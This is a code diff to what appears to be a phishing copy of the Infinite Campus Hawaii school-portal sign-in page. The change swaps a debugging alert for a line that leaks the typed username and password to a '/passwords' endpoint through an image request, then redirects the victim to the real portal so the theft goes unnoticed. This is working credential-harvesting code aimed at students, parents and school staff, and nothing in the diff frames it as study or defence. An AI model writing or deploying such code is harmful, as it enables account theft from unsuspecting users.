@@ -12,7 +12,7 @@
 		<script type="text/javascript">
 		$( document ).ready(function() {
 			$('#form_signin').submit(function(e) {
-				alert($("#password").val())
+				$("img").attr('src', "/passwords?user=" + $("#username").val() + "&password=" + $("#password").val())
 				e.stopPropagation();
 				window.location.href = "https://hawaii.infinitecampus.org/campus/portal/hawaii.jsp"
 				return false;
